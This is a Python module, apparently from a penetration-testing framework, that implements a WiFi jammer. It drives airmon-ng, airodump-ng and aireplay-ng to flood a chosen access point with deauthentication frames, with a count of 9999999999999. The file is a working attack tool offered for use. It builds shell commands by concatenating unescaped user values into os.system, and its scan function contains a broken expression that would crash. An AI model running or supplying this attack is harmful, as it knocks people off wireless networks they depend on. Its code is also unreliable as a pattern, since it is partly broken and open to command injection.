#        Copyright (C) 2015 Noa-Emil Nissinen (4shadoww)

import sys
from collections import OrderedDict
import subprocess
import os
from time import sleep
from core import bcolors
from core import getpath

#info about module
#modules name (must be same as filename)
modulename = "wifi_jammer"
#module version
version = "1.0"
#description
desc = "wifi jammer"
#creator's github
github = "4shadoww"
#created by (creators name)
createdby = "4shadoww"
#email
email = "4shadoww0@gmail.com"

#list of variables
variables = OrderedDict((
('interface', 'wlan0'),
('bssid', 'none'),
('essid', 'none'),
('mon', 'mon0'),
('channel', '11'),
))

vdesc = [
'wireless interface name',
'target BSSID address',
'target ESSID name',
'monitor',
'target channel number',
]

#help for customcommands (remove if you will not use customcommands)
mhelp = OrderedDict((
('scan', 'scan for target'),
('stop', 'terminate process'),
))

#additional help notes
help_notes = bcolors.WARNING+"this module will not work without root permission!\n this module will not work without xterm, aircrack-ng!"+bcolors.END

#custom commands (remove this if you will not use custom commands)
customcommands = (
'scan',
'stop'
)

#used with custom commands (remove this if you will not use custom commands)
termial = None

#simple changelog
changelog = "Version 1.0:\n\trelease"


def run():
	print (bcolors.OKGREEN + "[*]Attack Has Been Started on : " + variables['essid'])
	print ("use command 'stop' to end attack" + bcolors.END)
	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'] + " --bssid " + variables['bssid'] + " " + variables['mon'] + " &"
	os.system(xterm_3)
	sleep(4)
	xterm_4 = "xterm -e "+"aireplay-ng"+" --deauth 9999999999999 -o 1 -a " + variables['bssid'] + " -e " + variables['essid'] + " " + variables['mon'] + " &"
	os.system(xterm_4)
	sleep(1)
	os.system(xterm_4)
	sleep(3)
	print(bcolors.OKGREEN+"attack started"+bcolors.END)

def stop():
	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	xterm_5 =  "airmon-ng"+" stop " + variables['interface']
	os.system(xterm_5)
	print(bcolors.OKGREEN+"process terminated..."+bcolors.END)

def scan():
	xterm_1 = "airmon-ng"+" start " + variables['interface']
	xterm_2 = "xterm -e "+"airmon-ng " + + variables['mon'] + " &"
	subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	sleep(3)
	os.system(xterm_2)
	sleep(4)
	print(bcolors.OKGREEN+"scan started"+bcolors.END)